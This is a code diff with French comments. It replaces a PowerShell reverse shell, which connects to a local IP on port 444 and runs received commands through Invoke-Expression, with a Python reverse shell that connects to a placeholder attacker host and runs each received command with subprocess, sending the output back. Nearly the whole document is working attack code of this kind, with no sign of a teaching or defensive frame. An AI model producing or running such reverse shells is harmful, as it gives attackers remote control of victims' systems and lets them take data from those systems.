@@ -1,44 +1,35 @@
-# reverse_shell.ps1
+import socket
+import subprocess
+import os
 
-$ip = "192.168.1.66"  # Adresse IP de ta machine locale
-$port = 444  # Le port que tu écoutes sur ta machine locale
+def reverse_shell():
+    # Adresse IP de la machine attaquante et port sur lequel elle écoute
+    SERVER_IP = 'IP_ATTAQUANT'
+    SERVER_PORT = 444
 
-$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
-$stream = $client.GetStream()
-$writer = New-Object System.IO.StreamWriter($stream)
-$buffer = New-Object byte[] 1024
-$encoding = New-Object System.Text.ASCIIEncoding
+    try:
+        # Connexion au serveur de l'attaquant
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((SERVER_IP, SERVER_PORT))
 
-$writer.AutoFlush = $true
-$stream.ReadTimeout = -1
+        # Tant que la connexion est établie
+        while True:
+            # Recevoir la commande à exécuter
+            command = s.recv(1024).decode()
 
-$writer.WriteLine("Connexion établie à partir de : " + (hostname))
+            if command.lower() == "exit":
+                # Fermer la connexion si "exit" est reçu
+                break
 
-while($true) {
-    $writer.Write("> ")
-    $data = ""
-    while($stream.DataAvailable -eq $false) {
-        Start-Sleep -Milliseconds 200
-    }
+            # Exécuter la commande dans le shell
+            if command:
+                output = subprocess.getoutput(command)
+                s.send(output.encode())  # Envoyer le résultat de la commande à l'attaquant
 
-    while(($read = $stream.Read($buffer, 0, 1024)) -gt 0) {
-        $data += $encoding.GetString($buffer, 0, $read)
-        if($data.Trim().EndsWith("exit")) {
-            break
-        }
-    }
+        s.close()
 
-    if($data.Trim().ToLower() -eq "exit") {
-        break
-    }
+    except Exception as e:
+        print(f"Erreur dans la connexion: {e}")
 
-    try {
-        $output = Invoke-Expression $data 2>&1
-        $writer.WriteLine($output)
-    } catch {
-        $writer.WriteLine("Erreur : " + $_.Exception.Message)
-    }
-}
-
-$stream.Close()
-$client.Close()
+if __name__ == "__main__":
+    reverse_shell()
